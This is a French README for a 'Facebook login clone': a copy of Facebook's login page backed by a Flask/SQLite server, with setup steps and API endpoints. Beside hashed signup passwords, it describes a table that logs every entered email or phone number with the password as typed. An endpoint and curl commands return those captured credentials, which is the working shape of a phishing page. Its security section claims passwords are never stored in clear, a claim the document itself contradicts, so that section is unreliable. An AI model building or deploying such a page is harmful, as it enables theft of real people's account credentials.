# 📘 Facebook Login Clone - Backend Python

Un clone complet de la page de connexion Facebook avec:
- **Frontend**: HTML, CSS et JavaScript responsive
- **Backend**: Python Flask avec base de données SQLite
- **Sécurité**: Hachage des mots de passe avec Werkzeug

## 🚀 Installation et Configuration

### 1. Installer Python (si nécessaire)
- Téléchargez Python 3.8+ depuis [python.org](https://www.python.org)
- Assurez-vous que Python est ajouté au PATH

### 2. Installer les dépendances

Ouvrez un terminal/PowerShell dans le dossier du projet et exécutez:

```bash
pip install -r requirements.txt
```

### 3. Démarrer le serveur backend

```bash
python app.py
```

Vous devriez voir:
```
==================================================
🚀 Serveur Facebook Backend démarré!
==================================================
Adresse: http://localhost:5000
Base de données: facebook.db
==================================================
```

### 4. Ouvrir la page de connexion

- Ouvrez `index.html` dans votre navigateur (ou utilisez un serveur local)
- La page se connectera automatiquement au serveur Python sur le port 5000

## 📊 Endpoints API

### Inscription
```
POST /api/signup
Body: {
  "firstname": "Jean",
  "lastname": "Dupont",
  "email": "jean@example.com",
  "password": "monmotdepasse",
  "birth_date": "1990-05-15",
  "gender": "Homme"
}
```

### Connexion
```
POST /api/login
Body: {
  "email_or_phone": "jean@example.com",
  "password": "monmotdepasse"
}
```

### Afficher tous les utilisateurs
```
GET /api/users
```

### Afficher toutes les données de connexion (email/phone + mots de passe)
```
GET /api/connection-data
```

### Afficher les logs de connexion
```
GET /api/login-logs
```

### Afficher les statistiques
```
GET /api/stats
```

## 📁 Structure des fichiers

```
fb page/
├── index.html              # Page HTML
├── styles.css              # Styles CSS
├── script.js               # Code JavaScript (frontend)
├── app.py                  # Serveur Flask (backend)
├── requirements.txt        # Dépendances Python
├── facebook.db             # Base de données SQLite (créée automatiquement)
└── README.md               # Ce fichier
```

## 🗄️ Base de données

La base de données SQLite contient 3 tables:

### Table `users`
- `id`: ID unique
- `firstname`: Prénom
- `lastname`: Nom
- `email`: Email (unique)
- `phone`: Numéro de téléphone
- `password`: Mot de passe (haché)
- `birth_date`: Date de naissance
- `gender`: Sexe
- `created_at`: Date de création

### Table `connection_data`
- `id`: ID unique
- `email_or_phone`: Email ou numéro entré
- `password`: Mot de passe entré
- `timestamp`: Horodatage

### Table `login_logs`
- `id`: ID unique
- `email_or_phone`: Email ou numéro
- `success`: Succès ou non (1 ou 0)
- `ip_address`: Adresse IP
- `timestamp`: Horodatage

## 🔍 Consulter les données

### Avec Python (dans un terminal):
```python
import sqlite3

conn = sqlite3.connect('facebook.db')
cursor = conn.cursor()

# Voir tous les utilisateurs
cursor.execute('SELECT email, firstname, lastname FROM users')
for row in cursor.fetchall():
    print(row)

conn.close()
```

### Via API REST:
```bash
# Récupérer tous les utilisateurs
curl http://localhost:5000/api/users

# Récupérer toutes les données de connexion
curl http://localhost:5000/api/connection-data

# Récupérer les statistiques
curl http://localhost:5000/api/stats
```

## 🔐 Sécurité

- Les mots de passe sont **hachés** avec Werkzeug (SHA-256 + salt)
- Les mots de passe ne sont **jamais** stockés en clair
- CORS activé pour les requêtes cross-origin
- Validation côté serveur pour tous les champs

## 📝 Fonctionnalités

✅ Inscription avec validation complète
✅ Connexion avec vérification du mot de passe
✅ Base de données persistante
✅ Logs de connexion
✅ Statistiques d'utilisation
✅ Interface responsive (mobile, tablette, desktop)
✅ Animations fluides
✅ Validation en temps réel

## ⚠️ Dépannage

### "Impossible de se connecter au serveur"
- Assurez-vous que le serveur Python est en cours d'exécution (`python app.py`)
- Vérifiez que le port 5000 n'est pas utilisé par un autre processus
- Vérifiez les dépendances: `pip install -r requirements.txt`

### Erreur "Module not found"
```bash
# Installez les dépendances à nouveau
pip install -r requirements.txt
```

### Base de données corrompue
```bash
# Supprimez l'ancien fichier et le serve créera un nouveau
del facebook.db
python app.py
```

## 🎨 Personnalisation

### Changer le port du serveur
Modifiez dans `app.py`:
```python
app.run(port=8000)  # Au lieu de 5000
```

### Puis dans `script.js`:
```javascript
fetch('http://localhost:8000/api/login', ...)
```

## 📱 Compatible

- ✅ Chrome, Firefox, Safari, Edge
- ✅ Desktop, Tablet, Mobile
- ✅ Windows, Mac, Linux

## 🛠️ Technologies utilisées

- **Frontend**: HTML5, CSS3, JavaScript (vanilla)
- **Backend**: Python 3, Flask
- **Base de données**: SQLite3
- **Sécurité**: Werkzeug (hachage des mots de passe)

## 📞 Support

Pour toute question ou problème, consultez les logs du serveur Python ou vérifiez la console du navigateur (F12).

---

**Auteur**: Créé avec ❤️ en 2026
